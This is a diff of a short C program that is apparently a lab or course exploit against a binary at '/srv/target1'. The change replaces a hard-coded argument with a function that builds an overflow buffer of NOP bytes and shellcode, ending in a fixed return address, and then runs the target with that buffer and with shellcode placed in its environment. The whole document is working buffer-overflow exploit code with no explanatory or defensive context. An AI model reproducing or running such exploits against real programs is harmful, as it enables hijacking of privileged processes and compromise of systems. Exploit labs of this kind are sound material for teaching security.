@@ -5,21 +5,27 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target1"
+const char* TARGET = "/srv/target1";
 
-int main(void)
-{
-  char *args[3]; 
-  char *env[1];
-  
-  args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x19\xd7\xff\xff";
+const int BSIZE = 16;
+const int SHSIZE = sizeof(shellcode) - 1;
+const uint32_t RET = 0xffffd4bc;
 
-  args[2] = NULL;
-  
-  env[0] = shellcode;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+char* prep() {
+  char* buf = malloc(BSIZE + 1);
+  memset(buf, 0x90, BSIZE);
+  memcpy(buf, shellcode, SHSIZE);
+  *(uint32_t*)(buf + BSIZE - 4) = RET;
+  buf[BSIZE] = '\0';
+  return buf;
+}
 
-  return 0;
+int main() {
+    char* args[3] = {(char*)TARGET, prep(), NULL};
+    char* env[2] = {shellcode, NULL};
+
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
